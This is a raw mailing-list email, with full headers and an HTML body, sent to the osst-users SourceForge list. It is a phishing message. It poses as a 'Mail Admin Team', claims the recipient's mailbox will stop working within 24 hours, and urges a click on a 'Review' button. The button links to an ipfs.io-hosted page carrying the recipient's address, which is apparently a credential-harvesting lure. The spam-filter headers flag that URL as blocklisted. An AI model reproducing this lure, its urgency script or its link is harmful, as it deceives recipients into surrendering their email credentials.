Return-Path: <osst-users-bounces@lists.sourceforge.net>
X-Original-To: lists+osst-users@lfdr.de
Delivered-To: lists+osst-users@lfdr.de
Received: from lists.sourceforge.net (lists.sourceforge.net [216.105.38.7])
	by mail.lfdr.de (Postfix) with ESMTPS id A978173EE39
	for <lists+osst-users@lfdr.de>; Tue, 27 Jun 2023 00:03:17 +0200 (CEST)
Received: from [127.0.0.1] (helo=sfs-ml-3.v29.lw.sourceforge.com)
	by sfs-ml-3.v29.lw.sourceforge.com with esmtp (Exim 4.95)
	(envelope-from <osst-users-bounces@lists.sourceforge.net>)
	id 1qDuIl-0000Sx-Mq
	for lists+osst-users@lfdr.de;
	Mon, 26 Jun 2023 22:03:16 +0000
Received: from [172.30.20.202] (helo=mx.sourceforge.net)
 by sfs-ml-3.v29.lw.sourceforge.com with esmtps (TLS1.2) tls
 TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (Exim 4.95)
 (envelope-from <administrator@luciacocciconsulentehome.com>)
 id 1qDuIj-0000Sq-QD for osst-users@lists.sourceforge.net;
 Mon, 26 Jun 2023 22:03:14 +0000
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
 d=sourceforge.net; s=x; h=Content-Transfer-Encoding:Content-Type:MIME-Version
 :Message-ID:Date:Subject:To:From:Sender:Reply-To:Cc:Content-ID:
 Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
 :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
 List-Subscribe:List-Post:List-Owner:List-Archive;
 bh=2R/j3RL1iqGx48DnKisOwTcXuTadcpi2HWaMlf8KwQA=; b=H1F6FWSVV9iYR2wHcRbciQS6Lo
 KNkKQgAmyDiVtvkT4g/eMVhx8cveu0S2z4647oBOlXXT50PUk8PqjZs0OI7gsiTkGaRx50nxbsgni
 ZRi7axsRQyW4rJ9o/WQb9s5Kb6vdHqIm72wLwSI209phGLxOhqhb5Ck1WZSwhVXQHelk=;
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=sf.net; s=x
 ;
 h=Content-Transfer-Encoding:Content-Type:MIME-Version:Message-ID:Date:
 Subject:To:From:Sender:Reply-To:Cc:Content-ID:Content-Description:Resent-Date
 :Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:
 References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:List-Post:
 List-Owner:List-Archive; bh=2R/j3RL1iqGx48DnKisOwTcXuTadcpi2HWaMlf8KwQA=; b=l
 Ej4j1Q3gUmVeXY/uCS3tMS4gnUWVnthy/HiFkCpEkJIovFLTn80A4FMa/TbqODWsNW2H6wlGHgWng
 gKqXsbjDqXgIWUnFuqjTogB5SYrethjxangIOZfe7J3rLSsZu1Ny/rmrBatZQoAdjWNFU80k14rwo
 1NDmySg6kUCfBznw=;
Received: from server.sito-wp.com ([185.146.23.43])
 by sfi-mx-2.v28.lw.sourceforge.com with esmtps
 (TLS1.2:ECDHE-RSA-AES256-GCM-SHA384:256) (Exim 4.95)
 id 1qDuIj-0002TT-Cc for osst-users@lists.sourceforge.net;
 Mon, 26 Jun 2023 22:03:14 +0000
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
 d=luciacocciconsulentehome.com; s=default; h=Content-Transfer-Encoding:
 Content-Type:MIME-Version:Message-ID:Date:Subject:To:From:Sender:Reply-To:Cc:
 Content-ID:Content-Description:Resent-Date:Resent-From:Resent-Sender:
 Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:References:List-Id:
 List-Help:List-Unsubscribe:List-Subscribe:List-Post:List-Owner:List-Archive;
 bh=2R/j3RL1iqGx48DnKisOwTcXuTadcpi2HWaMlf8KwQA=; b=WLFXwfdXRlMdgZ2/PmdLNTumr6
 +wjSGxw8926mUEzvXaGsqao3RF97aS++rcKeQOjV6IgqNDQBUh9W03uTr6aXRMy2iXhnZgwIApicU
 6n16kxHtffwWAB/R1xfWi/PklINyGmrXvQR4GY79iNsiYTqH1OghNHIAdf06a2IacpsQSEl9cDYFq
 NMbZoEEVVGFf5einQrL+ZL0sr524Zi3bpvqkYxmO0njx2yg4SUxkpedsUocVU0C8u7Yu/+C6UvUhI
 DCKlAbC12F6jd9u4Ub1REOf5CzNVAP1Gesxhu5XLVIDnAb3y4opUstrTyqKZJyUoNmR/hNgox9kL2
 N/eyJI0Q==;
Received: from [46.183.222.100] (port=63572 helo=luciacocciconsulentehome.com)
 by server.sito-wp.com with esmtpsa (TLS1.2) tls
 TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (Exim 4.96)
 (envelope-from <administrator@luciacocciconsulentehome.com>)
 id 1qDuIc-0002LI-1X for osst-users@lists.sourceforge.net;
 Tue, 27 Jun 2023 00:03:06 +0200
From: =?UTF-8?B?wqkgTWFpbCBTZXJ2ZXIgQWRtaW4=?=<administrator@luciacocciconsulentehome.com>
To: osst-users@lists.sourceforge.net
Date: 27 Jun 2023 08:03:04 +1000
Message-ID: <20230627080304.A8A726B58EB77DC6@luciacocciconsulentehome.com>
MIME-Version: 1.0
X-AntiAbuse: This header was added to track abuse,
 please include it with any abuse report
X-AntiAbuse: Primary Hostname - server.sito-wp.com
X-AntiAbuse: Original Domain - lists.sourceforge.net
X-AntiAbuse: Originator/Caller UID/GID - [47 12] / [47 12]
X-AntiAbuse: Sender Address Domain - luciacocciconsulentehome.com
X-Get-Message-Sender-Via: server.sito-wp.com: authenticated_id:
 administrator@luciacocciconsulentehome.com
X-Authenticated-Sender: server.sito-wp.com: administrator@luciacocciconsulentehome.com
X-Source: 
X-Source-Args: 
X-Source-Dir: 
X-Spam-Score: 1.0 (+)
X-Spam-Report: Spam detection software,
 running on the system "util-spamd-2.v13.lw.sourceforge.com", 
 has NOT identified this incoming email as spam.  The original
 message has been attached to this so you can view it or label
 similar future email.  If you have any questions, see
 the administrator of that system for details.
 Content preview:  Hello osst-users, Due to annual updates on all email servers
 today 6/27/2023 8:03:04 a.m. Your email: osst-users@lists.sourceforge.net
 will stop sending and receiving messages if not Reviewed immediately within
 24 hou [...] 
 Content analysis details:   (1.0 points, 6.0 required)
 pts rule name              description
 ---- ---------------------- --------------------------------------------------
 0.1 URIBL_SBL_A Contains URL's A record listed in the Spamhaus SBL
 blocklist [URIs: ipfs.io]
 1.0 RCVD_IN_UCE1           RBL: IP Listed in UCEPROTECT Level 1
 [185.146.23.43 listed in dnsbl-1.uceprotect.net]
 -0.0 SPF_PASS               SPF: sender matches SPF record
 0.0 SPF_HELO_NONE          SPF: HELO does not publish an SPF Record
 0.0 HTML_MESSAGE           BODY: HTML included in message
 0.1 MIME_HTML_ONLY         BODY: Message only has text/html MIME parts
 0.1 DKIM_SIGNED            Message has a DKIM or DK signature, not necessarily
 valid
 -0.1 DKIM_VALID_AU          Message has a valid DKIM or DK signature from
 author's domain
 -0.1 DKIM_VALID Message has at least one valid DKIM or DK signature
 -0.1 DKIM_VALID_EF          Message has a valid DKIM or DK signature from
 envelope-from domain
 0.0 T_KAM_HTML_FONT_INVALID Test for Invalidly Named or Formatted
 Colors in HTML
 -0.0 T_SCC_BODY_TEXT_LINE   No description available.
X-Headers-End: 1qDuIj-0002TT-Cc
Subject: [Osst-users]
 =?UTF-8?B?W+KaoCBSZW1pbmRlci9BY3Rpb24tUmVxdWlyZWRdIC0g?=osst-users@lists.sourceforge.net
X-BeenThere: osst-users@lists.sourceforge.net
X-Mailman-Version: 2.1.21
Precedence: list
List-Id: <osst-users.lists.sourceforge.net>
List-Unsubscribe: <https://lists.sourceforge.net/lists/options/osst-users>,
 <mailto:osst-users-request@lists.sourceforge.net?subject=unsubscribe>
List-Archive: <http://sourceforge.net/mailarchive/forum.php?forum_name=osst-users>
List-Post: <mailto:osst-users@lists.sourceforge.net>
List-Help: <mailto:osst-users-request@lists.sourceforge.net?subject=help>
List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/osst-users>,
 <mailto:osst-users-request@lists.sourceforge.net?subject=subscribe>
Content-Type: multipart/mixed; boundary="===============8303558057520922805=="
Errors-To: osst-users-bounces@lists.sourceforge.net

--===============8303558057520922805==
Content-Type: text/html
Content-Transfer-Encoding: quoted-printable

<HTML><HEAD>
<META name=3DGENERATOR content=3D"MSHTML 11.00.9600.19699"></HEAD>
<BODY>
<DIV id=3D:107 class=3D"Ar Au Ao" style=3D"DISPLAY: block">
<DIV spellcheck=3Dfalse role=3Dtextbox tabIndex=3D1 aria-label=3DMeldingste=
kst aria-multiline=3Dtrue aria-controls=3D:12p id=3D:103 class=3D"Am Al edi=
table LW-avf tS-tW tS-tY" hideFocus contentEditable=3Dtrue style=3D"DIRECTI=
ON: ltr; MIN-HEIGHT: 376px" aria-owns=3D:12p g_editable=3D"true">
<DIV id=3D:1bg class=3D"Ar Au Ao" style=3D"DISPLAY: block">
<DIV aria-expanded=3Dfalse spellcheck=3Dfalse role=3Dtextbox tabIndex=3D1 a=
ria-label=3DMeldingstekst aria-multiline=3Dtrue aria-controls=3D:1ke id=3D:=
1bk class=3D"Am Al editable LW-avf tS-tW tS-tY" hideFocus contentEditable=
=3Dtrue style=3D"DIRECTION: ltr; MIN-HEIGHT: 376px" aria-owns=3D:1ke g_edit=
able=3D"true">
<DIV id=3Dm_523803327168844309gmail-:8o>
<DIV aria-expanded=3Dfalse role=3Dtextbox aria-label=3DMeldingstekst aria-m=
ultiline=3Dtrue aria-controls=3D:134 id=3Dm_523803327168844309gmail-:8s sty=
le=3D"DIRECTION: ltr; MIN-HEIGHT: 376px">
<P style=3D"BORDER-LEFT-WIDTH: 0px; BOX-SIZING: border-box; BORDER-RIGHT-WI=
DTH: 0px; VERTICAL-ALIGN: baseline; BORDER-BOTTOM-WIDTH: 0px; PADDING-BOTTO=
M: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0p=
x; BORDER-TOP-WIDTH: 0px; font-stretch: inherit"><SPAN style=3D"BOX-SIZING:=
 border-box"><B><FONT face=3D"trebuchet ms, sans-serif"><FONT color=3D#2c36=
3a>Hello&nbsp;</FONT><FONT color=3D#45818e>osst-users</FONT><FONT color=3D#=
2c363a>,</FONT></FONT></B></SPAN></P>
<DIV style=3D"BORDER-LEFT-WIDTH: 0px; BOX-SIZING: border-box; BORDER-RIGHT-=
WIDTH: 0px; VERTICAL-ALIGN: baseline; BORDER-BOTTOM-WIDTH: 0px; PADDING-BOT=
TOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: =
0px; BORDER-TOP-WIDTH: 0px; font-stretch: inherit">
<UL>
<LI><FONT style=3D'FONT-FAMILY: "trebuchet ms",sans-serif' color=3D#444444>=
Due to annual updates on all email servers today</FONT><FONT style=3D'FONT-=
FAMILY: "trebuchet ms",sans-serif; FONT-WEIGHT: bold' color=3D#2c363a>&nbsp=
;</FONT><FONT style=3D'FONT-FAMILY: "trebuchet ms",sans-serif; FONT-WEIGHT:=
 bold' color=3D#45818e>6/27/2023 8:03:04 a.m.&nbsp;</FONT><BR></LI>
<LI><FONT face=3D"trebuchet ms, sans-serif"><FONT color=3D#444444>Your emai=
l:</FONT><FONT style=3D"FONT-WEIGHT: bold" color=3D#2c363a>&nbsp;</FONT><FO=
NT style=3D"FONT-WEIGHT: bold" color=3D#45818e>osst-users@lists.sourceforge=
=2Enet</FONT><FONT style=3D"FONT-WEIGHT: bold" color=3D#134f5c>&nbsp;</FONT=
><FONT color=3D#444444>will stop sending and receiving messages if not Revi=
ewed immediately within 24 hours.</FONT></FONT></LI></UL>
<DIV>
<H2 style=3D"BOX-SIZING: border-box; MARGIN-BOTTOM: 15px; MARGIN-TOP: 0px; =
LINE-HEIGHT: 22px"><FONT color=3D#45818e size=3D4 face=3D"trebuchet ms, san=
s-serif">What do you need to do ASAP ?</FONT></H2>
<UL>
<LI><FONT face=3D"trebuchet ms, sans-serif">Kindly review your email below =
in order to continue using all&nbsp;your mail service(s),&nbsp;</FONT></LI>=
</UL></DIV></DIV>
<DIV>
<TABLE style=3D"HEIGHT: 53px; WIDTH: 515px; BORDER-COLLAPSE: collapse; COLO=
R: rgb(33,33,33); TEXT-ALIGN: center; LINE-HEIGHT: 0px; font-stretch: inher=
it" cellPadding=3D0 bgColor=3D#b0de00>
<TBODY style=3D"BOX-SIZING: border-box">
<TR style=3D"BOX-SIZING: border-box">
<TD style=3D"BOX-SIZING: border-box; BACKGROUND: rgb(53,88,168); BORDER-COL=
LAPSE: collapse; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 15px;=
 PADDING-RIGHT: 15px" bgColor=3D#3558a8 vAlign=3Dmiddle><B><FONT face=3D"tr=
ebuchet ms, sans-serif"><SPAN style=3D"BOX-SIZING: border-box">
<A id=3Dm_523803327168844309m_-2779241285454975064m_-1362553137044918720m_-=
3964984764345573554m_-2319544981159992383m_-8834711222208386714m_-150230257=
7655501806m_-4806438935319875170m_-4338741853426128966m_5454013634956105640=
m_-5804205811818643454m_-3320113434645782740gmail-v1v1x_x_x_x_x_x_m_5228229=
997781280426m_-4582864256604226611gmail-x_x_gmail-m_4628436401360325222m_12=
70713067398412679m_-1564249429224047007gmail-m_7976746255904800835LPlnk4047=
47 style=3D"BORDER-LEFT-WIDTH: 0px; BOX-SIZING:=20
border-box; BORDER-RIGHT-WIDTH: 0px; VERTICAL-ALIGN: baseline; BORDER-BOTTO=
M-WIDTH: 0px; COLOR: rgb(255,255,255); PADDING-BOTTOM: 15px; PADDING-TOP: 1=
5px; PADDING-LEFT: 0px; MARGIN: 0px; DISPLAY: block; LINE-HEIGHT: 21px; PAD=
DING-RIGHT: 0px; BORDER-TOP-WIDTH: 0px; BACKGROUND-COLOR: transparent; text=
-decoration-line: none; font-stretch: inherit" href=3D"https://ipfs.io/ipfs=
/bafybeidow5qo7e65s6fxnohgf26zeaknxfck3jy6i4y2xdaqsl3oldxt2m/29-06-ne-59y-3=
9fgcweb%20cv-e359h-r5gfw.html#osst-users@lists.sourceforge.net"=20
rel=3Dnoreferrer target=3D_blank data-saferedirecturl=3D"https://www.google=
=2Ecom/url?q=3Dhttps://ipfs.io/ipfs/bafybeicr32ti3bog7muxg5vloghkigkcafxwv2=
6xkq5mczl25bom6gaaty/29-06-ne-59y-39fgcweb%2520cv-e359hy-t9h.html%23%5B%5B-=
Email-%5D%5D&amp;source=3Dgmail&amp;ust=3D1686984373344000&amp;usg=3DAOvVaw=
2eqAc6JWilIqZ0mMkHxjJj"><SPAN style=3D"BOX-SIZING: border-box"><FONT size=
=3D4>Review&nbsp;&nbsp;osst-users@lists.sourceforge.net</FONT></SPAN></A></=
SPAN></FONT></B>
<DIV style=3D"BORDER-LEFT-WIDTH: 0px; BOX-SIZING: border-box; BORDER-RIGHT-=
WIDTH: 0px; VERTICAL-ALIGN: baseline; BORDER-BOTTOM-WIDTH: 0px; PADDING-BOT=
TOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: =
0px; BORDER-TOP-WIDTH: 0px"><B><FONT face=3D"trebuchet ms, sans-serif"><BR =
style=3D"BOX-SIZING: border-box"></FONT></B></DIV></TD></TR></TBODY></TABLE=
><BR></DIV>
<DIV style=3D"BORDER-LEFT-WIDTH: 0px; BOX-SIZING: border-box; BORDER-RIGHT-=
WIDTH: 0px; VERTICAL-ALIGN: baseline; BORDER-BOTTOM-WIDTH: 0px; PADDING-BOT=
TOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: =
0px; BORDER-TOP-WIDTH: 0px; font-stretch: inherit">
<DIV style=3D"BORDER-LEFT-WIDTH: 0px; BOX-SIZING: border-box; BORDER-RIGHT-=
WIDTH: 0px; VERTICAL-ALIGN: baseline; BORDER-BOTTOM-WIDTH: 0px; PADDING-BOT=
TOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: =
0px; BORDER-TOP-WIDTH: 0px; font-stretch: inherit">
<DIV style=3D"BORDER-LEFT-WIDTH: 0px; BOX-SIZING: border-box; BORDER-RIGHT-=
WIDTH: 0px; VERTICAL-ALIGN: baseline; BORDER-BOTTOM-WIDTH: 0px; PADDING-BOT=
TOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: =
0px; BORDER-TOP-WIDTH: 0px"><SPAN style=3D"BOX-SIZING: border-box"><FONT fa=
ce=3D"trebuchet ms, sans-serif">
<UL style=3D"COLOR: rgb(44,54,58)">
<LI>If you fail to review your email<FONT style=3D"FONT-WEIGHT: bold" color=
=3D#2c363a>&nbsp;</FONT><FONT style=3D"FONT-WEIGHT: bold" color=3D#45818e>o=
sst-users@lists.sourceforge.net</FONT><FONT style=3D"FONT-WEIGHT: bold" col=
or=3D#134f5c>&nbsp;</FONT>within 24hours: Your Basic Email services and set=
tings will cease to function adequately and Incoming messages would be lost=
 on the server.!</LI></UL></FONT></SPAN></DIV>
<DIV style=3D"BORDER-LEFT-WIDTH: 0px; BOX-SIZING: border-box; BORDER-RIGHT-=
WIDTH: 0px; VERTICAL-ALIGN: baseline; BORDER-BOTTOM-WIDTH: 0px; COLOR: rgb(=
32,31,30); PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN=
: 0px; PADDING-RIGHT: 0px; BORDER-TOP-WIDTH: 0px"><SPAN style=3D"BOX-SIZING=
: border-box; COLOR: rgb(51,51,51)"><FONT size=3D1 face=3D"trebuchet ms, sa=
ns-serif"><B>Mail Admin Team</B></FONT></SPAN></DIV>
<DIV style=3D"BORDER-LEFT-WIDTH: 0px; BOX-SIZING: border-box; BORDER-RIGHT-=
WIDTH: 0px; VERTICAL-ALIGN: baseline; BORDER-BOTTOM-WIDTH: 0px; PADDING-BOT=
TOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: =
0px; BORDER-TOP-WIDTH: 0px"><FONT size=3D1 face=3D"trebuchet ms, sans-serif=
"><B><SPAN style=3D"BOX-SIZING: border-box; COLOR: rgb(51,51,51)">&copy; 20=
23&nbsp;</SPAN><FONT color=3D#134f5c><SPAN style=3D"BOX-SIZING: border-box"=
>mail.lists.sourceforge.net</SPAN><SPAN style=3D"BOX-SIZING: border-box">
&nbsp;</SPAN></FONT><SPAN style=3D"BOX-SIZING: border-box; COLOR: rgb(51,51=
,51)">All Rights Reserved</SPAN></B></FONT></DIV></DIV></DIV></DIV></DIV></=
DIV></DIV></DIV></DIV></BODY></HTML>


--===============8303558057520922805==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline


--===============8303558057520922805==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

_______________________________________________
Osst-users mailing list
Osst-users@lists.sourceforge.net
https://lists.sourceforge.net/lists/listinfo/osst-users

--===============8303558057520922805==--
